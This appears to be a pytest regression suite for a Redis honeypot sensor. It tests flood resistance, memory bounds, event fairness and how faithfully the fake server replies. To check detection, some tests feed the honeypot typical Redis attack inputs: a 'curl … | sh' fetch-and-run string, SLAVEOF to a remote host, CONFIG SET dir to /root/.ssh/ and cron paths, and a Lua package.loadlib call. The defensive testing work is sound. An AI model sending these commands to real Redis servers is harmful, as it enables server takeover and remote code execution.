"""Regression tests for the security review: CPU, reply memory, event fairness, fidelity."""

from __future__ import annotations

import asyncio
import contextlib
import hashlib
import sys
import time
from pathlib import Path

from conftest import Harness, HarnessFactory, cmd, talk
from suckerpot_common import EventType

from redis_sensor.memguard import MemoryGuard

# The test harness relaxes the per-IP session limit; these tests need the production one.
_PRODUCTION_PER_IP = {"per_ip_rate": 2.0, "per_ip_burst": 30.0}


def _exhaust_per_ip_budgets(h: Harness) -> None:
    """Drive two flooding sources until their own per-IP budgets are spent (no timing involved).

    After this the shared admission/event buckets sit at their reserve, which only light
    sources may spend: a quiet source must still be recorded in full."""
    for ip in ("127.0.0.2", "127.0.0.4"):
        for _ in range(100):
            h.sink.admit(ip)
        for i in range(600):
            h.sink.emit(
                session_id="flood",
                src_ip=ip,
                src_port=1,
                type_=EventType.command,
                data={"input": f"x{i}"},
            )
            h.sink.emit(
                session_id="flood",
                src_ip=ip,
                src_port=1,
                type_=EventType.login_attempt,
                data={"username": f"u{i}"},
            )


PATHOLOGICAL = "*a" * 31 + "*b"


async def _conn(port: int, ip: str = "127.0.0.1", rcvbuf: int | None = None):  # type: ignore[no-untyped-def]
    import socket

    sock = socket.socket()
    if rcvbuf:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
    sock.bind((ip, 0))
    sock.setblocking(False)
    await asyncio.get_running_loop().sock_connect(sock, ("127.0.0.1", port))
    return await asyncio.open_connection(sock=sock)


_CLIENT = r"""
import socket, sys, threading, time
port, payload = int(sys.argv[1]), sys.stdin.buffer.read()
def run(ip):
    s = socket.socket(); s.bind((ip, 0)); s.settimeout(1); s.connect(("127.0.0.1", port))
    t = threading.Thread(target=lambda: s.sendall(payload), daemon=True); t.start()
    end = time.time() + 5
    while time.time() < end:
        try:
            if not s.recv(65536): break
        except OSError: pass
ts = [threading.Thread(target=run, args=("127.0.0.%d" % (2 + i % 2),)) for i in range(16)]
[t.start() for t in ts]; [t.join() for t in ts]
"""


async def test_cpu_flood_never_blocks_the_loop(make_harness: HarnessFactory) -> None:
    """2 IPs x 8 connections of pipelined pathological CONFIG GET (the reviewer's cpu2 case).

    The attackers run in another process so only the server's own work can block the loop."""
    async with make_harness(max_bytes_in=16 << 20, max_per_ip=8, max_commands=5000) as h:
        payload = cmd("CONFIG", "GET", *([PATHOLOGICAL] * 32)) * 1000
        lag = 0.0
        stop = False

        async def heartbeat() -> None:
            nonlocal lag
            while not stop:
                t = time.perf_counter()
                await asyncio.sleep(0.01)
                lag = max(lag, time.perf_counter() - t - 0.01)

        hb = asyncio.create_task(heartbeat())
        proc = await asyncio.create_subprocess_exec(
            sys.executable, "-c", _CLIENT, str(h.port),
            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )  # fmt: skip
        assert proc.stdin is not None
        lag = 0.0  # spawning the client process is the test's own cost
        proc.stdin.write(payload)
        await proc.stdin.drain()
        proc.stdin.close()
        await asyncio.sleep(1.0)
        latencies = []
        for _ in range(5):
            t0 = time.perf_counter()
            r, w = await asyncio.open_connection("127.0.0.1", h.port)
            w.write(cmd("PING"))
            assert await asyncio.wait_for(r.read(16), 5) == b"+PONG\r\n"
            latencies.append(time.perf_counter() - t0)
            w.close()
            await asyncio.sleep(0.2)
        await proc.wait()
        stop = True
        await hb
        # A loop turn visits every busy connection for one 5 ms slice, so lag grows with the
        # number of busy connections and the machine's load; the bound is far below the 10 s
        # watchdog limit.
        assert lag < 2.0, f"event loop blocked for {lag:.2f}s"
        assert max(latencies) < 1.5


async def test_pathological_commands_get_empty_results_when_over_budget(
    make_harness: HarnessFactory,
) -> None:
    async with make_harness() as h:
        out = await talk(h.port, cmd("CONFIG", "GET", *([PATHOLOGICAL] * 32)) * 300, wait=2.0)
        assert out.endswith(b"*0\r\n")
        assert await talk(h.port, cmd("CONFIG", "GET", "dir")) != b""  # others are unaffected


async def test_reply_memory_stays_bounded_for_non_reading_peers(
    make_harness: HarnessFactory, tmp_path: Path
) -> None:
    """200 peers over 25 IPs that never read: what the sensor holds per connection is capped.

    (The container-level check, memory against the cgroup limit, is in blackbox.sh.)"""
    (tmp_path / "memory.current").write_text("1000000\n")
    (tmp_path / "memory.max").write_text("268435456\n")
    (tmp_path / "memory.stat").write_text("inactive_file 0\n")
    guard = MemoryGuard(256 << 20, cgroup=tmp_path)
    async with make_harness(guard=guard, max_connections=200, max_per_ip=8, write_timeout=2.0) as h:
        conns = []
        payload = cmd("INFO", "all") * 400 + cmd("ECHO", "x" * 400_000) * 4
        for i in range(200):
            r, w = await _conn(h.port, f"127.0.0.{2 + i // 8}", rcvbuf=2048)
            w.write(payload)
            conns.append((r, w))
        peak = held = 0
        for _ in range(30):
            await asyncio.sleep(0.1)
            peak = max(peak, h.sensor.buffered)
            held = max([held, *(s.held for s in h.sensor.sessions)])
        assert peak <= h.cfg.max_buffered
        assert 0 < held < 300_000  # parser input + unsent reply bytes, per connection
        assert peak < 200 * 300_000
        for _, w in conns:
            w.close()
        await asyncio.sleep(2.5)
        assert h.sensor.total == 0 and h.sensor.buffered == 0


async def test_large_replies_are_correct_when_streamed(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        big = "z" * 500_000
        out = await talk(h.port, cmd("ECHO", big), wait=1.0)
        assert out == b"$500000\r\n" + big.encode() + b"\r\n"
        value = "v" * 16_000
        out = await talk(h.port, cmd("SET", "k", value) + cmd("MGET", *(["k"] * 64)), wait=1.0)
        assert out == b"+OK\r\n*64\r\n" + (b"$16000\r\n" + value.encode() + b"\r\n") * 64


async def test_flooding_ip_cannot_starve_another_ip(make_harness: HarnessFactory) -> None:
    async with make_harness(
        publish_delay=0.02,
        max_per_ip=8,
        max_commands=10_000,
        sink_kw={"queue_size": 300, **_PRODUCTION_PER_IP},
    ) as h:
        end = time.monotonic() + 3.0

        async def flooder() -> None:
            n = 0
            while time.monotonic() < end:
                try:
                    r, w = await _conn(h.port, "127.0.0.2")
                except OSError:
                    await asyncio.sleep(0.05)
                    continue
                w.write(
                    b"".join(
                        cmd("CONFIG", "SET", "dir", f"/var/spool/cron/{n}{i}") for i in range(60)
                    )
                    + b"".join(cmd("AUTH", f"pw{n}{i}") for i in range(60))
                    + cmd("QUIT")
                )
                n += 1
                with contextlib.suppress(Exception):
                    async with asyncio.timeout(2):
                        while await r.read(65536):
                            pass
                w.close()

        floods = [asyncio.create_task(flooder()) for _ in range(6)]
        await asyncio.sleep(1.5)
        _exhaust_per_ip_budgets(h)
        r, w = await _conn(h.port, "127.0.0.3")
        w.write(
            cmd("SET", "x", "curl http://203.0.113.50/victim.sh | sh")
            + cmd("SLAVEOF", "203.0.113.51", "8886")
            + cmd("AUTH", "victimpw")
            + cmd("QUIT")
        )
        while await r.read(65536):
            pass
        w.close()
        await asyncio.gather(*floods)
        await h.sink.flush(10.0)
        mine = [e for e in h.publisher.events if str(e.src_ip) == "127.0.0.3"]
        kinds = sorted(
            e.type + ":" + str(e.data.get("kind") or e.data.get("command") or "")
            if e.type in ("command", "scan")
            else str(e.type)
            for e in mine
        )
        assert kinds == [
            "command:QUIT",
            "command:SET",
            "command:SLAVEOF",
            "connect",
            "disconnect",
            "download_attempt",
            "login_attempt",
            "scan:redis_replication",
        ]
        assert h.sink.ip_limited + h.sink.queue_full > 0  # the flood was in fact limited


async def test_type_correct_replies_for_other_commands(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        assert await talk(h.port, cmd("LRANGE", "nokey", "0", "-1")) == b"*0\r\n"
        assert await talk(h.port, cmd("HGETALL", "nokey")) == b"*0\r\n"
        resp3 = await talk(h.port, cmd("HELLO", "3") + cmd("HGETALL", "n") + cmd("SMEMBERS", "n"))
        assert resp3.endswith(b"%0\r\n~0\r\n")
        assert await talk(h.port, cmd("HGET", "nokey", "f")) == b"$-1\r\n"
        assert await talk(h.port, cmd("LLEN", "nokey")) == b":0\r\n"
        assert await talk(h.port, cmd("RENAME", "nokey", "b")) == b"-ERR no such key\r\n"
        assert await talk(h.port, cmd("CLUSTER", "INFO")) == (
            b"-ERR This instance has cluster support disabled\r\n"
        )
        assert await talk(h.port, cmd("ACL", "WHOAMI")) == b"$7\r\ndefault\r\n"
        assert await talk(h.port, cmd("FUNCTION", "LIST")) == b"*0\r\n"
        assert await talk(h.port, cmd("MEMORY", "USAGE", "nokey")) == b"$-1\r\n"
        assert (await talk(h.port, cmd("XADD", "s", "*", "f", "v"))).startswith(b"$")
        out = await talk(h.port, cmd("MIGRATE", "203.0.113.5", "6379", "k", "0", "100"))
        assert out == b"-IOERR error or timeout connecting to the client\r\n"
        wrong = b"-WRONGTYPE Operation against a key holding the wrong kind of value\r\n"
        out = await talk(
            h.port,
            cmd("LPUSH", "l", "a", "b") + cmd("GET", "l") + cmd("LLEN", "l") + cmd("TYPE", "l"),
        )
        assert out == b":2\r\n" + wrong + b":2\r\n+list\r\n"
        assert (
            await talk(h.port, cmd("SET", "s", "v") + cmd("LPUSH", "s", "a")) == b"+OK\r\n" + wrong
        )
        flags = {f for e in await h.events("command") for f in e.data["flags"]}
        assert "migrate" in flags


async def test_cross_protocol_sends_nothing_even_after_pipelined_commands(
    make_harness: HarnessFactory,
) -> None:
    async with make_harness() as h:
        out = await talk(h.port, b"PING\r\nPOST / HTTP/1.1\r\nHost: x\r\n\r\n", wait=1.0)
        assert out == b""
        assert (await h.wait_disconnects(1))[0].data["reason"] == "cross_protocol"


async def test_redis_7_2_consistency(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        info = (await talk(h.port, cmd("INFO", "keyspace"))).decode()
        assert "subexpiry" not in info and "db0:keys=" in info
        out = (
            await talk(
                h.port,
                cmd("CLIENT", "SETINFO", "LIB-NAME", "redis-py")
                + cmd("CLIENT", "SETINFO", "LIB-VER", "5.2.1")
                + cmd("CLIENT", "LIST"),
            )
        ).decode()
        assert "rbs=16384" in out and "lib-name=redis-py lib-ver=5.2.1" in out
        script = "return redis.call('get','k')"
        sha = hashlib.sha1(script.encode(), usedforsecurity=False).hexdigest()
        assert await talk(h.port, cmd("SCRIPT", "LOAD", script)) == b"$40\r\n%s\r\n" % sha.encode()
        bad = "package.loadlib('x','y')"
        sha = hashlib.sha1(bad.encode(), usedforsecurity=False).hexdigest()
        assert sha.encode() in await talk(h.port, cmd("EVAL", bad, "0"))


async def test_rejected_connections_show_in_info(make_harness: HarnessFactory) -> None:
    async with make_harness(max_per_ip=1, first_data_timeout=3.0) as h:
        r1, w1 = await asyncio.open_connection("127.0.0.1", h.port)
        await asyncio.sleep(0.1)
        r2, w2 = await asyncio.open_connection("127.0.0.1", h.port)
        await r2.read(100)
        w2.close()
        w1.write(cmd("INFO", "stats"))
        data = await asyncio.wait_for(r1.read(65536), 3)
        assert b"rejected_connections:1\r\n" in data
        w1.close()


async def test_config_history_in_disconnect(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        await talk(
            h.port,
            cmd("CONFIG", "SET", "dir", "/root/.ssh/")
            + cmd("CONFIG", "SET", "dir", "/tmp/")
            + cmd("CONFIG", "SET", "dbfilename", "x"),
        )
        d = (await h.wait_disconnects(1))[0].data
        assert d["config_history"] == [
            ["dir", "/root/.ssh/"],
            ["dir", "/tmp/"],
            ["dbfilename", "x"],
        ]


async def test_oversized_set_is_accepted_like_redis(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(h.port, cmd("SET", "big", b"x" * 600_000) + cmd("PING"), wait=1.5)
        assert out == b"+OK\r\n+PONG\r\n"
        e = (await h.events("command"))[0]
        assert "oversized_arg" in e.data["flags"]


_SCAN_CLIENT = r"""
import socket, sys, threading, time
port, payload = int(sys.argv[1]), sys.stdin.buffer.read()
def run(ip):
    s = socket.socket(); s.bind((ip, 0)); s.settimeout(1); s.connect(("127.0.0.1", port))
    threading.Thread(target=lambda: s.sendall(payload), daemon=True).start()
    end = time.time() + 6
    while time.time() < end:
        try:
            if not s.recv(65536): break
        except OSError: pass
ts = [threading.Thread(target=run, args=("127.0.0.%d" % (2 + i % 3),)) for i in range(21)]
[t.start() for t in ts]; [t.join() for t in ts]
"""


async def test_indicator_scan_is_charged_and_cannot_saturate_the_cpu(
    make_harness: HarnessFactory,
) -> None:
    """3 IPs x 7 connections x 250 pipelined SETs of 16 KB of 'curl http://a/b ' (M4)."""
    async with make_harness(max_bytes_in=16 << 20, max_per_ip=8, max_commands=5000) as h:
        payload = b"".join(
            cmd("SET", "k", ("curl http://a/b " * 1000)[:16000] + str(i)) for i in range(250)
        )
        proc = await asyncio.create_subprocess_exec(
            sys.executable, "-c", _SCAN_CLIENT, str(h.port),
            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )  # fmt: skip
        assert proc.stdin is not None
        proc.stdin.write(payload)
        await proc.stdin.drain()
        proc.stdin.close()
        await asyncio.sleep(1.0)
        latencies = []
        for _ in range(5):
            t0 = time.perf_counter()
            r, w = await asyncio.open_connection("127.0.0.1", h.port)
            w.write(cmd("PING"))
            assert await asyncio.wait_for(r.read(16), 5) == b"+PONG\r\n"
            latencies.append(time.perf_counter() - t0)
            w.close()
            await asyncio.sleep(0.2)
        await proc.wait()
        print("PING latencies", [round(x, 3) for x in latencies])
        assert max(latencies) < 1.0, latencies
        skipped = [e for e in await h.events("command") if "scan_skipped" in e.data["flags"]]
        assert skipped or h.sensor.global_steps.available() > 0  # throttled or simply cheap


async def test_repeated_text_is_scanned_once(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        text = "curl http://198.51.100.1/a | sh"
        await talk(h.port, cmd("SET", "a", text) + cmd("SET", "b", text), wait=0.5)
        assert len(await h.events("download_attempt")) == 1  # also deduplicated per session


async def test_every_flood_session_gets_its_disconnect(make_harness: HarnessFactory) -> None:
    async with make_harness(
        publish_delay=0.005, max_per_ip=8, max_commands=10_000, sink_kw=_PRODUCTION_PER_IP
    ) as h:
        sessions = 0
        end = time.monotonic() + 3.0

        async def flooder() -> None:
            nonlocal sessions
            while time.monotonic() < end:
                r, w = await _conn(h.port, "127.0.0.2")
                w.write(
                    b"".join(cmd("CONFIG", "SET", "dir", f"/x/{sessions}{i}") for i in range(80))
                    + cmd("QUIT")
                )
                sessions += 1
                with contextlib.suppress(Exception):
                    async with asyncio.timeout(2):
                        while await r.read(65536):
                            pass
                w.close()
                await asyncio.sleep(0.2)

        await asyncio.gather(*(flooder() for _ in range(3)))
        _exhaust_per_ip_budgets(h)
        r, w = await _conn(h.port, "127.0.0.3")
        w.write(cmd("AUTH", "victimpw") + cmd("QUIT"))
        while await r.read(65536):
            pass
        w.close()
        await h.sink.flush(10.0)
        mine = [e for e in h.publisher.events if str(e.src_ip) == "127.0.0.2"]
        assert sum(e.type == "connect" for e in mine) > 0
        assert sum(e.type == "disconnect" for e in mine) >= sum(e.type == "connect" for e in mine)
        theirs = sorted(str(e.type) for e in h.publisher.events if str(e.src_ip) == "127.0.0.3")
        assert theirs == ["command", "connect", "disconnect", "login_attempt"]
        assert h.sink.ip_limited > 0
